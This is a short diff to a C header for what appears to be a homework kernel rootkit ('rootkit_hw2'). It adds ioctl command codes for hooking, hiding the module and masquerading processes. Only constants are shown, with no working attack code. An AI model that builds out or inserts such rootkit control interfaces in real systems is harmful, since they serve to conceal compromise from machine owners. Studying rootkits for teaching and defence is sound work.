@@ -12,4 +12,8 @@ struct masq_proc_req {
 	struct masq_proc *list;
 };
 
+#define IOCTL_MOD_HOOK 100
+#define IOCTL_MOD_HIDE 200
+#define IOCTL_MOD_MASQ 300
+
 #endif /* __ROOTKIT_HW2_H */
